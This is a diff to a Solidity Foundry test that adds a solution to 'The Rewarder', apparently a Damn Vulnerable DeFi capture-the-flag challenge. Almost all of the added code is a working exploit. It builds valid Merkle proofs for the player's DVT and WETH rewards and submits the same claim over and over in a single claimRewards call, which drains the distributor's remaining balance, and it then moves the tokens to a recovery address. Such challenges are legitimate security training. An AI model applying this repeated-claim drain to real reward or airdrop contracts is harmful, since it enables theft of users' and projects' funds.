@@ -149,6 +149,52 @@ contract TheRewarderChallenge is Test {
      */
     function test_theRewarder() public checkSolvedByPlayer {
         
+        string memory dvtPath = "/test/the-rewarder/dvt-distribution.json";
+        string memory wethPath = "/test/the-rewarder/weth-distribution.json";
+
+        bytes32[] memory dvtLeaves = _loadRewards(dvtPath);
+        bytes32[] memory wethLeaves = _loadRewards(wethPath);
+        merkle = new Merkle();
+        dvtRoot = merkle.getRoot(dvtLeaves);
+        wethRoot = merkle.getRoot(wethLeaves);
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        (uint256 playerDvtIndex, uint256 playerDvtAmount) = _getIndexAndAmountOfPlayer(dvtPath, player);
+        uint256 noOfDvtClaimsPossible = distributor.getRemaining(address(dvt)) / playerDvtAmount;
+        Claim[] memory dvtClaims = new Claim[](noOfDvtClaimsPossible);
+        
+        // First, the DVT claim
+        for(uint256 i = 0; i < noOfDvtClaimsPossible; i++) {
+            dvtClaims[i] = Claim({
+                batchNumber: 0,
+                amount: playerDvtAmount,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, playerDvtIndex)
+            });
+        }
+        
+        distributor.claimRewards({inputClaims: dvtClaims, inputTokens: tokensToClaim});
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        
+        (uint256 playerWethIndex, uint256 playerWethAmount) = _getIndexAndAmountOfPlayer(wethPath, player);
+        uint256 noOfWethClaimsPossible = distributor.getRemaining(address(weth)) / playerWethAmount;
+        Claim[] memory wethClaims = new Claim[](noOfWethClaimsPossible);
+
+        // Second, the WETH claim
+        for(uint256 i = 0; i < noOfWethClaimsPossible; i++) {
+            wethClaims[i] = Claim({
+                batchNumber: 0,
+                amount: playerWethAmount,
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, playerWethIndex)
+            });
+        }
+
+        distributor.claimRewards({inputClaims: wethClaims, inputTokens: tokensToClaim});
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
@@ -187,5 +233,21 @@ contract TheRewarderChallenge is Test {
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
             leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
         }
+    }
+
+    function _getIndexAndAmountOfPlayer(string memory path, address playerAddress) private view returns (uint256, uint256) {
+        Reward[] memory rewards =
+            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
+        
+        uint256 index;
+
+        for(uint256 i = 0; i < rewards.length; i++) {
+            if(rewards[i].beneficiary == playerAddress) {
+                index = i;
+                break;
+            }
+        }
+
+        return (index, rewards[index].amount);   
     }
 }
